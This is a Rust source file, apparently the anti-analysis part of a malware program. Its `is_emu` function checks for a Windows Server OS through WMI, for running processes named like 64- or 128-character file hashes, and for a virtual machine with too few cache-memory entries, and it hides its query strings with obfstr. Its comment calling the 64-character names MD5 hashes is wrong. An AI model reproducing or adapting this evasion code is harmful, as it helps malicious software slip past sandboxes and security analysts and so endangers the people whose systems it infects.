use std::{collections::HashMap, path::Path, process};

use sysinfo::{ProcessExt, System, SystemExt};
use wmi::{COMLibrary, Variant, WMIConnection};

pub fn is_emu() -> bool {
    is_server_os() || is_vm_by_wim_temper() || detect_hash_processes()
}

fn is_server_os() -> bool {
    let hostname = whoami::hostname();
    let namespace_path = format!("{}{}", hostname, obfstr::obfstr!("\\ROOT\\CIMV2"));
    let Ok(wmi_con) =
        WMIConnection::with_namespace_path(&namespace_path, COMLibrary::new().unwrap().into())
    else {
        return false;
    };

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!(
            "SELECT ProductType FROM Win32_OperatingSystem"
        ))
        .unwrap();

    drop(wmi_con);

    for result in results {
        for value in result.values() {
            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
                return true;
            }
        }
    }

    false
}

fn detect_hash_processes() -> bool {
    let mut system = System::new();
    system.refresh_all();

    for (_, process) in system.processes() {
        if let Some(arg) = process.cmd().get(0) {
            let path = Path::new(arg);
            match path.file_stem() {
                Some(file_name) => {
                    if file_name.len() == 64 || file_name.len() == 128 {
                        // Md5 Or Sha512
                        return true;
                    }
                }
                None => (),
            }
        }
    }

    false
}

fn is_vm_by_wim_temper() -> bool {
    let wmi_con = WMIConnection::new(COMLibrary::new().unwrap().into()).unwrap();

    let results: Vec<HashMap<String, Variant>> = wmi_con
        .raw_query(obfstr::obfstr!("SELECT * FROM Win32_CacheMemory"))
        .unwrap();

    drop(wmi_con);

    if results.len() < 2 {
        return true;
    }

    false
}
